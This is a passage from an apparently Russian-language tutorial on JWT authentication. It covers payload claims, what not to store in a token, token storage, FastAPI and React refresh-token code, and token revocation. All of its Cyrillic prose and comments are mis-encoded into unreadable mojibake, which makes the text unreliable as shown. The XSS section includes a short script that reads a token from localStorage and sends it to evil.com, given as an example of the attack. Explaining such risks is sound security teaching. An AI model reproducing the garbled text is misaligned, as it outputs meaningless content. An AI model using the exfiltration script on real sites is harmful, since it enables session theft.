- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞–º–µ—á–∞–µ—Ç –∏—Å—Ç–µ—á–µ–Ω–∏–µ Access Token
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤ —Ñ–æ–Ω–µ
- –ü–µ—Ä–µ–ª–æ–≥–∏–Ω–∏–≤–∞—Ç—å—Å—è –Ω—É–∂–Ω–æ —Ä–∞–∑ –≤ 7 –¥–Ω–µ–π (–∏–ª–∏ –±–æ–ª—å—à–µ)

**–ö–æ–Ω—Ç—Ä–æ–ª—å:**

- –°–µ—Ä–≤–µ—Ä –º–æ–∂–µ—Ç **–æ—Ç–æ–∑–≤–∞—Ç—å** Refresh Token (logout —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤)
- –ú–æ–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö Refresh Token –≤ –ë–î

---

## –ß—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤ Payload?

### –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø–æ–ª—è (Claims)

**Registered Claims** (–∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ):

```json
{
  "iss": "https://auth.example.com",  // Issuer (–∫—Ç–æ –≤—ã–¥–∞–ª)
  "sub": "user-id-123",                // Subject (–¥–ª—è –∫–æ–≥–æ)
  "aud": "api.example.com",            // Audience (–¥–ª—è —á–µ–≥–æ)
  "exp": 1735689600,                   // Expiration (–∫–æ–≥–¥–∞ –∏—Å—Ç–µ—á–µ—Ç)
  "nbf": 1735603200,                   // Not Before (–Ω–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª–µ–Ω –¥–æ)
  "iat": 1735603200,                   // Issued At (–∫–æ–≥–¥–∞ –≤—ã–¥–∞–Ω)
  "jti": "unique-token-id"             // JWT ID (—É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID —Ç–æ–∫–µ–Ω–∞)
}
```

### –ö–∞—Å—Ç–æ–º–Ω—ã–µ –ø–æ–ª—è

**–í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ:**

```json
{
  "sub": "3",                          // ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  "email": "user@example.com",         // Email (–æ—Ç–∫—Ä—ã—Ç–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è!)
  "roles": ["user", "moderator"],      // –†–æ–ª–∏
  "permissions": ["read", "write"],    // –ü—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞
  "tenant_id": "company-123",          // –ú—É–ª—å—Ç–∏—Ç–µ–Ω–∞–Ω—Ç–Ω–æ—Å—Ç—å
  "session_id": "abc-xyz",             // ID —Å–µ—Å—Å–∏–∏ (–¥–ª—è –æ—Ç–∑—ã–≤–∞)
  "exp": 1763543874
}
```

---

## –ß—Ç–æ –ö–û–ù–ö–†–ï–¢–ù–û –º–æ–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å –≤ JWT? (–ü—Ä–∏–º–µ—Ä—ã –∏–∑ –∂–∏–∑–Ω–∏)

### ‚úÖ –°—Ü–µ–Ω–∞—Ä–∏–π 1: –ü—Ä–æ—Å—Ç–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ

**–ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π –Ω–∞–±–æ—Ä:**

```json
{
  "sub": "user-123",           // ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  "exp": 1735689600            // –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è
}
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç –±—ç–∫–µ–Ω–¥:**

- –ü–æ–ª—É—á–∞–µ—Ç `sub` –∏–∑ —Ç–æ–∫–µ–Ω–∞
- –î–µ–ª–∞–µ—Ç –∑–∞–ø—Ä–æ—Å –≤ –ë–î: `SELECT * FROM users WHERE id = 'user-123'`
- –ü–æ–ª—É—á–∞–µ—Ç email, —Ä–æ–ª–∏, –Ω–∞—Å—Ç—Ä–æ–π–∫–∏

**–ü–ª—é—Å—ã:** –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ç–æ–∫–µ–Ω–∞  
**–ú–∏–Ω—É—Å—ã:** –ó–∞–ø—Ä–æ—Å –≤ –ë–î –ø—Ä–∏ –∫–∞–∂–¥–æ–π –ø—Ä–æ–≤–µ—Ä–∫–µ

---

### ‚úÖ –°—Ü–µ–Ω–∞—Ä–∏–π 2: –°–∏—Å—Ç–µ–º–∞ —Å —Ä–æ–ª—è–º–∏ (CRM, –∞–¥–º–∏–Ω–∫–∞)

```json
{
  "sub": "user-456",
  "email": "admin@company.com",
  "roles": ["admin", "support"],
  "permissions": [
    "users.read",
    "users.write",
    "users.delete",
    "reports.read"
  ],
  "exp": 1735689600
}
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç –±—ç–∫–µ–Ω–¥:**

```python
# FastAPI –ø—Ä–∏–º–µ—Ä
@app.delete("/users/{user_id}")
async def delete_user(user_id: int, token: dict = Depends(verify_token)):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–∞–≤–∞ –ë–ï–ó –æ–±—Ä–∞—â–µ–Ω–∏—è –∫ –ë–î!
    if "users.delete" not in token["permissions"]:
        raise HTTPException(403, "–ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ")
    
    # –£–¥–∞–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    db.delete(user_id)
```

**–ü–ª—é—Å—ã:** –ù–µ –Ω—É–∂–µ–Ω –∑–∞–ø—Ä–æ—Å –≤ –ë–î –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤  
**–ú–∏–Ω—É—Å—ã:** –ï—Å–ª–∏ –∏–∑–º–µ–Ω–∏–ª–∏ —Ä–æ–ª–∏ ‚Üí –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è (–∏–ª–∏ –∂–¥–∞—Ç—å –∏—Å—Ç–µ—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞)

---

### ‚úÖ –°—Ü–µ–Ω–∞—Ä–∏–π 3: –ú—É–ª—å—Ç–∏—Ç–µ–Ω–∞–Ω—Ç–Ω–æ—Å—Ç—å (SaaS –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã)

**–ü—Ä–∏–º–µ—Ä: Slack, Trello, Notion**

```json
{
  "sub": "user-789",
  "email": "john@example.com",
  "workspace_id": "workspace-abc",     // –ö –∫–∞–∫–æ–º—É –≤–æ—Ä–∫—Å–ø–µ–π—Å—É –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç
  "workspace_role": "owner",           // –†–æ–ª—å –≤ —ç—Ç–æ–º –≤–æ—Ä–∫—Å–ø–µ–π—Å–µ
  "plan": "premium",                   // –¢–∞—Ä–∏—Ñ–Ω—ã–π –ø–ª–∞–Ω
  "exp": 1735689600
}
```

**–ß—Ç–æ –¥–µ–ª–∞–µ—Ç –±—ç–∫–µ–Ω–¥:**

```python
@app.get("/workspaces/{workspace_id}/documents")
async def get_documents(workspace_id: str, token: dict = Depends(verify_token)):
    # –ü—Ä–æ–≤–µ—Ä–∫–∞: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—ã—Ç–∞–µ—Ç—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ–∫—É–º–µ–Ω—Ç—ã –°–í–û–ï–ì–û –≤–æ—Ä–∫—Å–ø–µ–π—Å–∞?
    if token["workspace_id"] != workspace_id:
        raise HTTPException(403, "–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–∞—Ä–∏—Ñ–∞ (–ª–∏–º–∏—Ç—ã)
    if token["plan"] == "free" and document_count > 10:
        raise HTTPException(402, "–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç –±–µ—Å–ø–ª–∞—Ç–Ω–æ–≥–æ –ø–ª–∞–Ω–∞")
    
    return documents
```

**–ü–ª—é—Å—ã:** –ë—ã—Å—Ç—Ä–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–Ω–æ—Å—Ç–∏ –∏ —Ç–∞—Ä–∏—Ñ–∞  
**–ú–∏–Ω—É—Å—ã:** –ü—Ä–∏ —Å–º–µ–Ω–µ —Ç–∞—Ä–∏—Ñ–∞ –Ω—É–∂–µ–Ω relogin

---

### ‚úÖ –°—Ü–µ–Ω–∞—Ä–∏–π 4: –ú–∏–∫—Ä–æ—Å–µ—Ä–≤–∏—Å—ã (e-commerce)

```json
{
  "sub": "user-999",
  "email": "buyer@example.com",
  "roles": ["customer"],
  "cart_id": "cart-xyz",               // ID –∫–æ—Ä–∑–∏–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
  "preferred_currency": "USD",         // –í–∞–ª—é—Ç–∞
  "country": "US",                     // –°—Ç—Ä–∞–Ω–∞ (–¥–ª—è –Ω–∞–ª–æ–≥–æ–≤)
  "exp": 1735689600
}
```

**–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞:**

```
User ‚Üí Gateway (–ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Ç–æ–∫–µ–Ω)
          ‚Üì
    Catalog Service (–ø–æ–ª—É—á–∞–µ—Ç —Ç–æ–≤–∞—Ä—ã, —Ü–µ–Ω—ã –≤ USD)
          ‚Üì
    Cart Service (—Ä–∞–±–æ—Ç–∞–µ—Ç —Å –∫–æ—Ä–∑–∏–Ω–æ–π cart-xyz)
          ‚Üì
    Payment Service (—Å—á–∏—Ç–∞–µ—Ç –Ω–∞–ª–æ–≥–∏ –¥–ª—è US)
```

**–ö–∞–∂–¥—ã–π —Å–µ—Ä–≤–∏—Å —á–∏—Ç–∞–µ—Ç —Ç–æ–∫–µ–Ω:**

- Catalog: –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `preferred_currency`
- Cart: –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `cart_id`
- Payment: –∏—Å–ø–æ–ª—å–∑—É–µ—Ç `country` –¥–ª—è —Ä–∞—Å—á–µ—Ç–∞ –Ω–∞–ª–æ–≥–æ–≤

**–ü–ª—é—Å—ã:** –°–µ—Ä–≤–∏—Å—ã –Ω–µ –∑–∞–≤–∏—Å—è—Ç –¥—Ä—É–≥ –æ—Ç –¥—Ä—É–≥–∞  
**–ú–∏–Ω—É—Å—ã:** –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–º–µ–Ω–∏–ª —Å—Ç—Ä–∞–Ω—É ‚Üí –Ω—É–∂–µ–Ω –Ω–æ–≤—ã–π —Ç–æ–∫–µ–Ω

---

### ‚úÖ –°—Ü–µ–Ω–∞—Ä–∏–π 5: –í—Ä–µ–º–µ–Ω–Ω—ã–π –¥–æ—Å—Ç—É–ø (–ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏—è, —à–∞—Ä–∏–Ω–≥)

```json
{
  "sub": "guest-user",
  "invited_by": "user-123",
  "document_id": "doc-456",
  "permissions": ["read"],             // –¢–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ
  "exp": 1735689600                    // –ò—Å—Ç–µ–∫–∞–µ—Ç —á–µ—Ä–µ–∑ —á–∞—Å
}
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**

- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–æ–∑–¥–∞–µ—Ç "—Å—Å—ã–ª–∫—É –¥–ª—è –≥–æ—Å—Ç—è"
- –ë—ç–∫–µ–Ω–¥ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –∫–æ—Ä–æ—Ç–∫–æ–∂–∏–≤—É—â–∏–π —Ç–æ–∫–µ–Ω
- –ì–æ—Å—Ç—å –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –ø–æ —Å—Å—ã–ª–∫–µ —Å —Ç–æ–∫–µ–Ω–æ–º –≤ URL
- –ú–æ–∂–µ—Ç —á–∏—Ç–∞—Ç—å –¥–æ–∫—É–º–µ–Ω—Ç 1 —á–∞—Å, –ø–æ—Ç–æ–º –¥–æ—Å—Ç—É–ø –ø—Ä–æ–ø–∞–¥–∞–µ—Ç

---

### ‚ùå –ß—Ç–æ –ù–ï —Ö—Ä–∞–Ω–∏—Ç—å: –ê–Ω—Ç–∏–ø—Ä–∏–º–µ—Ä—ã

```json
{
  "sub": "user-123",
  "password": "qwerty123",             // ‚ùå –ù–ò–ö–û–ì–î–ê! –ü–∞—Ä–æ–ª–∏ –Ω–µ –≤ —Ç–æ–∫–µ–Ω–µ!
  "credit_card": "1234-5678-9012",     // ‚ùå –ü—Ä–∏–≤–∞—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
  "api_secret": "sk_live_abc123",      // ‚ùå –°–µ–∫—Ä–µ—Ç–Ω—ã–µ –∫–ª—é—á–∏
  "ssn": "123-45-6789",                // ‚ùå –ù–æ–º–µ—Ä —Å–æ—Ü—Å—Ç—Ä–∞—Ö–∞
  "phone": "+1234567890",              // ‚ö†Ô∏è –û—Å—Ç–æ—Ä–æ–∂–Ω–æ —Å –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
  "address": "123 Main St",            // ‚ö†Ô∏è –ú–æ–∂–Ω–æ, –Ω–æ –ª—É—á—à–µ —Ö—Ä–∞–Ω–∏—Ç—å –≤ –ë–î
  "full_profile": { /* 50 –ø–æ–ª–µ–π */ }   // ‚ùå –¢–æ–∫–µ–Ω —Å—Ç–∞–Ω–µ—Ç –æ–≥—Ä–æ–º–Ω—ã–º
}
```

**–ü–æ–º–Ω–∏—Ç–µ:** JWT –¥–µ–∫–æ–¥–∏—Ä—É–µ—Ç—Å—è **–ª—é–±—ã–º —á–µ–ª–æ–≤–µ–∫–æ–º** –≤ –±—Ä–∞—É–∑–µ—Ä–µ. –í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–∫—Ä—ã—Ç—ã.

---

### –ó–æ–ª–æ—Ç–æ–µ –ø—Ä–∞–≤–∏–ª–æ

**–•—Ä–∞–Ω–∏—Ç–µ –≤ JWT:**

- ‚úÖ ID –∏ —Å—Å—ã–ª–∫–∏ (–º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Ç–∞–ª–∏ –∏–∑ –ë–î)
- ‚úÖ –†–æ–ª–∏ –∏ –ø—Ä–∞–≤–∞ (–¥–ª—è –±—ã—Å—Ç—Ä–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏)
- ‚úÖ –ú–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ (–≤–æ—Ä–∫—Å–ø–µ–π—Å, —Ç–∞—Ä–∏—Ñ, –ª–æ–∫–∞–ª—å)

**–ù–ï —Ö—Ä–∞–Ω–∏—Ç–µ:**

- ‚ùå –°–µ–∫—Ä–µ—Ç—ã (–ø–∞—Ä–æ–ª–∏, –∫–ª—é—á–∏)
- ‚ùå –ë–æ–ª—å—à–∏–µ –æ–±—ä–µ–º—ã –¥–∞–Ω–Ω—ã—Ö (–ø—Ä–æ—Ñ–∏–ª–∏ —Ü–µ–ª–∏–∫–æ–º)
- ‚ùå –ß–∞—Å—Ç–æ –º–µ–Ω—è—é—â–∏–µ—Å—è –¥–∞–Ω–Ω—ã–µ (–±–∞–ª–∞–Ω—Å —Å—á–µ—Ç–∞, –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ç–æ–≤–∞—Ä–æ–≤)

**–ù–∞ –±—ç–∫–µ–Ω–¥–µ –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä—è—Ç—å:**

```python
# –ü—Å–µ–≤–¥–æ–∫–æ–¥
if "admin" in token.roles:
    allow_access()
else:
    deny_access()
```

---

## –ß—Ç–æ –ù–ï –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –≤ Payload?

‚ùå **–°–µ–∫—Ä–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**

```json
{
  "password": "qwerty123",        // –ù–ò–ö–û–ì–î–ê!
  "api_key": "secret-key-123",    // –ù–ò–ö–û–ì–î–ê!
  "credit_card": "1234-5678"      // –ù–ò–ö–û–ì–î–ê!
}
```

‚ùå **–ë–æ–ª—å—à–∏–µ –¥–∞–Ω–Ω—ã–µ:**

```json
{
  "user_profile": { /* 100 –ø–æ–ª–µ–π */ },  // –¢–æ–∫–µ–Ω —Å—Ç–∞–Ω–µ—Ç –æ–≥—Ä–æ–º–Ω—ã–º
  "preferences": { /* JSON –Ω–∞ 5kb */ }  // –ü–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ!
}
```

‚úÖ **–¢–æ–ª—å–∫–æ —Å—Å—ã–ª–∫–∏:**

```json
{
  "user_id": "123",               // –ü–æ ID –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–æ—Ñ–∏–ª—å
  "session_id": "abc"             // –ü–æ ID —Å–µ—Å—Å–∏–∏ ‚Äî –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
}
```

---

## –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –Ω–∞ –±—ç–∫–µ–Ω–¥–µ

**FastAPI –¥–µ–ª–∞–µ—Ç —ç—Ç–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏:**

```python
from fastapi import Depends
from fastapi_users import FastAPIUsers

@app.get("/users/me")
async def get_me(user: User = Depends(current_user)):
    # FastAPI:
    # 1. –ò–∑–≤–ª–µ–∫–∞–µ—Ç —Ç–æ–∫–µ–Ω –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞ Authorization
    # 2. –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ–¥–ø–∏—Å—å (–≤–∞–ª–∏–¥–µ–Ω –ª–∏ —Ç–æ–∫–µ–Ω?)
    # 3. –ü—Ä–æ–≤–µ—Ä—è–µ—Ç exp (–Ω–µ –∏—Å—Ç–µ–∫ –ª–∏?)
    # 4. –ò–∑–≤–ª–µ–∫–∞–µ—Ç sub (ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
    # 5. –ó–∞–≥—Ä—É–∂–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –ë–î
    # 6. –ï—Å–ª–∏ –≤—Å—ë –û–ö ‚Üí –ø–µ—Ä–µ–¥–∞–µ—Ç –≤ —Ñ—É–Ω–∫—Ü–∏—é
    # 7. –ï—Å–ª–∏ –æ—à–∏–±–∫–∞ ‚Üí –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç 401
    
    return {"email": user.email}
```

**–í—ã –ù–ï –º–æ–∂–µ—Ç–µ:**

- –ü–æ–¥–¥–µ–ª–∞—Ç—å —Ç–æ–∫–µ–Ω (–Ω–µ—Ç SECRET_KEY)
- –ò–∑–º–µ–Ω–∏—Ç—å `sub` –Ω–∞ —á—É–∂–æ–π ID (–ø–æ–¥–ø–∏—Å—å –Ω–µ —Å–æ–π–¥–µ—Ç—Å—è)
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∏—Å—Ç–µ–∫—à–∏–π —Ç–æ–∫–µ–Ω (–ø—Ä–æ–≤–µ—Ä–∫–∞ `exp`)

---

## –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å: –ì–¥–µ —Ö—Ä–∞–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω—ã?

### ‚ùå localStorage (—Ç–µ–∫—É—â–∏–π –ø–æ–¥—Ö–æ–¥)

**–ü–ª—é—Å—ã:**

- –ü—Ä–æ—Å—Ç–æ
- –î–æ—Å—Ç—É–ø–Ω–æ –∏–∑ –ª—é–±–æ–≥–æ –º–µ—Å—Ç–∞

**–ú–∏–Ω—É—Å—ã:**

- **–£—è–∑–≤–∏–º–æ –∫ XSS** (Cross-Site Scripting)
- –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä–∏—Ç JS –∫–æ–¥ ‚Üí —É–∫—Ä–∞–¥–µ—Ç —Ç–æ–∫–µ–Ω

```javascript
// –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç
const stolenToken = localStorage.getItem('token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: stolenToken
});
```

---

### ‚úÖ HttpOnly Cookie (–ª—É—á—à–µ)

**–ü–ª—é—Å—ã:**

- JavaScript **–Ω–µ –º–æ–∂–µ—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å** (—Ñ–ª–∞–≥ `HttpOnly`)
- –ó–∞—â–∏—Ç–∞ –æ—Ç XSS
- –ë—Ä–∞—É–∑–µ—Ä –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –≤ –∫–∞–∂–¥–æ–º –∑–∞–ø—Ä–æ—Å–µ

**–ú–∏–Ω—É—Å—ã:**

- –£—è–∑–≤–∏–º–æ –∫ CSRF (Cross-Site Request Forgery)
- –ù—É–∂–Ω–∞ –∑–∞—â–∏—Ç–∞: CSRF —Ç–æ–∫–µ–Ω—ã, SameSite —Ñ–ª–∞–≥

**–ù–∞ –±—ç–∫–µ–Ω–¥–µ:**

```python
response.set_cookie(
    key="refresh_token",
    value=refresh_token,
    httponly=True,      # JS –Ω–µ –º–æ–∂–µ—Ç –ø—Ä–æ—á–∏—Ç–∞—Ç—å
    secure=True,        # –¢–æ–ª—å–∫–æ HTTPS
    samesite="strict"   # –ó–∞—â–∏—Ç–∞ –æ—Ç CSRF
)
```

---

### üèÜ –õ—É—á—à–∞—è –ø—Ä–∞–∫—Ç–∏–∫–∞

**Access Token** ‚Üí –≤ –ø–∞–º—è—Ç–∏ (React state)  
**Refresh Token** ‚Üí –≤ HttpOnly Cookie

**–ü–æ—á–µ–º—É:**

- Access Token –∂–∏–≤–µ—Ç 15 –º–∏–Ω—É—Ç ‚Üí –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∑–∞–ø—Ä–æ—Å–∏–º –Ω–æ–≤—ã–π —á–µ—Ä–µ–∑ Refresh
- Refresh Token –≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ ‚Üí JavaScript –Ω–µ –º–æ–∂–µ—Ç —É–∫—Ä–∞—Å—Ç—å
- –î–∞–∂–µ –µ—Å–ª–∏ XSS —É–∫—Ä–∞–¥–µ—Ç Access Token ‚Üí —á–µ—Ä–µ–∑ 15 –º–∏–Ω—É—Ç –±–µ—Å–ø–æ–ª–µ–∑–µ–Ω

---

## –†–µ–∞–ª–∏–∑–∞—Ü–∏—è Refresh Token (–ø—Ä–∏–º–µ—Ä)

### –ë—ç–∫–µ–Ω–¥ (FastAPI)

```python
@app.post("/auth/refresh")
async def refresh(refresh_token: str = Cookie(None)):
    # 1. –ü—Ä–æ–≤–µ—Ä—è–µ–º Refresh Token
    payload = jwt.decode(refresh_token, SECRET_KEY)
    user_id = payload["sub"]
    
    # 2. –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—ã–π Access Token
    new_access_token = create_access_token(user_id, expires_delta=15min)
    
    return {"access_token": new_access_token}
```

### –§—Ä–æ–Ω—Ç–µ–Ω–¥ (React)

```typescript
// Interceptor –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
const fetchWithAuth = async (url: string, options: RequestInit) => {
  let response = await fetch(url, {
    ...options,
    headers: {
      'Authorization': `Bearer ${accessToken}`,
    },
  });

  // –ï—Å–ª–∏ 401 ‚Üí –ø—Ä–æ–±—É–µ–º –æ–±–Ω–æ–≤–∏—Ç—å —Ç–æ–∫–µ–Ω
  if (response.status === 401) {
    const refreshResponse = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include', // –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç HttpOnly cookie
    });

    if (refreshResponse.ok) {
      const { access_token } = await refreshResponse.json();
      setAccessToken(access_token);
      
      // –ü–æ–≤—Ç–æ—Ä—è–µ–º –∏—Å—Ö–æ–¥–Ω—ã–π –∑–∞–ø—Ä–æ—Å —Å –Ω–æ–≤—ã–º —Ç–æ–∫–µ–Ω–æ–º
      response = await fetch(url, {
        ...options,
        headers: {
          'Authorization': `Bearer ${access_token}`,
        },
      });
    } else {
      // Refresh —Ç–æ–∫–µ–Ω —Ç–æ–∂–µ –∏—Å—Ç–µ–∫ ‚Üí logout
      logout();
    }
  }

  return response;
};
```

---

## –û—Ç–∑—ã–≤ —Ç–æ–∫–µ–Ω–æ–≤ (Token Revocation)

### –ü—Ä–æ–±–ª–µ–º–∞: Stateless = –Ω–µ—Ç –∫–æ–Ω—Ç—Ä–æ–ª—è

JWT ‚Äî **stateless**. –°–µ—Ä–≤–µ—Ä **–Ω–µ —Ö—Ä–∞–Ω–∏—Ç** —Å–ø–∏—Å–æ–∫ –≤—ã–¥–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤.

**–ß—Ç–æ —ç—Ç–æ –∑–Ω–∞—á–∏—Ç:**

- –í—ã–¥–∞–ª–∏ —Ç–æ–∫–µ–Ω —Å `exp` = —á–µ—Ä–µ–∑ 1 —á–∞—Å
- –¢–æ–∫–µ–Ω **–±—É–¥–µ—Ç –≤–∞–ª–∏–¥–µ–Ω 1 —á–∞—Å**, —á—Ç–æ –±—ã –Ω–∏ –ø—Ä–æ–∏–∑–æ—à–ª–æ
- –î–∞–∂–µ –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª "–í—ã–π—Ç–∏"
- –î–∞–∂–µ –µ—Å–ª–∏ –∞–¥–º–∏–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –∞–∫–∫–∞—É–Ω—Ç
- –î–∞–∂–µ –µ—Å–ª–∏ —Ç–æ–∫–µ–Ω —É–∫—Ä–∞–ª–∏

**–ü—Ä–æ–±–ª–µ–º–Ω—ã–µ —Å—Ü–µ–Ω–∞—Ä–∏–∏:**

1. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–∂–∞–ª "–í—ã–π—Ç–∏ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤" ‚Üí —Ç–æ–∫–µ–Ω—ã –Ω–∞ –¥—Ä—É–≥–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö –í–°–ï –ï–©–ï —Ä–∞–±–æ—Ç–∞—é—Ç
2. –ê–¥–º–∏–Ω –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ‚Üí –æ–Ω –º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –µ—â–µ 1 —á–∞—Å
3. –¢–æ–∫–µ–Ω —É–∫—Ä–∞–ª–∏ ‚Üí –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ –æ—Ç–æ–∑–≤–∞—Ç—å –¥–æ –∏—Å—Ç–µ—á–µ–Ω–∏—è

---

### ‚ö†Ô∏è –í–ê–ñ–ù–û: –û—Ç–∑—ã–≤ —Ç–æ–∫–µ–Ω–æ–≤ = –û–¢–•–û–î –æ—Ç Stateless

**–ó–∞–ø–æ–º–Ω–∏—Ç–µ:**

- –ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∏–π JWT = stateless = **–ù–ï–¢ –∫–æ–Ω—Ç—Ä–æ–ª—è** –ø–æ—Å–ª–µ –≤—ã–¥–∞—á–∏
- –õ—é–±–∞—è —Å–∏—Å—Ç–µ–º–∞ –æ—Ç–∑—ã–≤–∞ = **–≤–æ–∑–≤—Ä–∞—Ç –∫ state** = –Ω—É–∂–Ω–∞ –ë–î/Redis
- –≠—Ç–æ **–∂–µ—Ä—Ç–≤–∞** –ø—Ä–∏–Ω—Ü–∏–ø–∞–º–∏ —Ä–∞–¥–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

**–í—ã–≤–æ–¥:** –ï—Å–ª–∏ –Ω—É–∂–µ–Ω –º–≥–Ω–æ–≤–µ–Ω–Ω—ã–π –æ—Ç–∑—ã–≤ ‚Üí –≤–æ–∑–º–æ–∂–Ω–æ, –≤–∞–º –Ω—É–∂–Ω—ã **—Å–µ—Å—Å–∏–∏**, –∞ –Ω–µ JWT.

---

